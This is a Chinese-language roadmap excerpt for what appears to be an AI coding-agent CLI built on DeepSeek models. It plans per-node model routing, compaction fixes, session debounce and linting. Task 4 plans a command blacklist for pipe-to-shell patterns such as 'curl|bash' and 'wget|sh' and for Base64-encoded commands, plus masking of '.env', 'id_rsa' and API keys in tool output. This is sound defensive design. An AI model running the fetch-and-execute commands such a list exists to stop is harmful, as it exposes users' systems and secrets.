| 🔵 P2 | 多模型编排路由 | 2 文件（新模块 + loop 集成） | 任务-模型最佳匹配 |
| 🔵 P2 | 模型自动 fallback | 2 文件（provider + config） | 提高可用性 |
| 🔵 P2 | 异常行为检测 | 1 文件（loop.ts） | 防止模型失控 |

> **特别注意**：P0-4 是**必现 bug**——`deepseek-v4-flash` 在 DeepSeek 官方 API 中不存在，所有触发 compact 的场景都会报错，建议优先修复。

---

---

## 六、阶段四实施计划（v0.4）

> 目标：稳定性提升 + 多模型节点路由 + 工程基建

### Task 1: 多模型节点路由

不同 Agent Loop 节点使用不同模型，达到成本与效果的最优平衡：

| 节点 | 模型 | 原因 |
|------|------|------|
| 主推理循环 | `deepseek-v4-pro` | 需要强推理，决定工具策略 |
| Compact 摘要压缩 | `deepseek-v4-flash` | 总结历史，不需深度推理，快且省 |
| Plan mode 规划阶段 | `deepseek-v4-pro` | 任务分解需强推理 |
| Plan mode 执行阶段 | `deepseek-v4-flash` | 按计划执行，flash 即可 |

**配置设计：**
```json
{
  "model": "deepseek-v4-pro",
  "compactModel": "deepseek-v4-flash",
  "planExecuteModel": "deepseek-v4-flash"
}
```

**改动文件：**
- `packages/core/src/config.ts` — 新增 `compactModel`、`planExecuteModel` 字段
- `packages/core/src/agent/compact.ts` — `compactMessages()` 接收 model 参数
- `packages/core/src/agent/plan-mode.ts` — 执行阶段使用 `planExecuteModel`
- `packages/cli/src/main.ts` — 传递各节点模型参数

---

### Task 2: compact 参数化（去除 hardcode）

- `compact.ts` 中 hardcode 的模型名改为接收参数
- 上下文窗口大小从 `DEFAULT_MAX_CONTEXT = 64000` 改为根据模型能力矩阵动态获取
- 新建 `packages/core/src/provider/model-capabilities.ts`

---

### Task 3: Session save debounce + TodoWrite 迁移

- `DiskSessionStore.save()` 增加 500ms debounce，避免连续工具调用频繁写盘
- `TodoWrite` 工具状态从全局变量迁移到 `Session.todos` 字段

---

### Task 4: 黑名单增强 + 输出敏感信息过滤

- `blacklist.ts` 增加组合攻击模式检测：`curl|bash`、`wget|sh`、Base64 编码命令
- 工具输出过滤层：Bash 结果返回前替换 `.env`、`id_rsa`、`API_KEY` 等敏感模式为 `***`

---

### Task 5: 流式中断状态修复

- ESC/Ctrl+C 中断后，清理 session 中残留的不完整 assistant 消息
- 避免下次会话时不完整消息导致模型混乱

---

### Task 6: Biome lint 接入

- 安装 `@biomejs/biome`
- 替换 `package.json` 中 `lint` 空占位脚本
- 配置 `biome.json`，启用 TypeScript lint + format

---

### 优先级与依赖

```
Task 2 (compact参数化)
  └─→ Task 1 (多模型路由，依赖 compact 接受 model 参数)
Task 3 (debounce + TodoWrite) — 独立
Task 4 (黑名单增强) — 独立
Task 5 (中断状态修复) — 独立
Task 6 (Biome) — 独立
```

建议执行顺序：2 → 1 → 3 → 5 → 4 → 6

---

*本 grow 文档根据 v0.3 代码库实测数据编写，覆盖率为 2026-06-30 的 vitest 报告。*
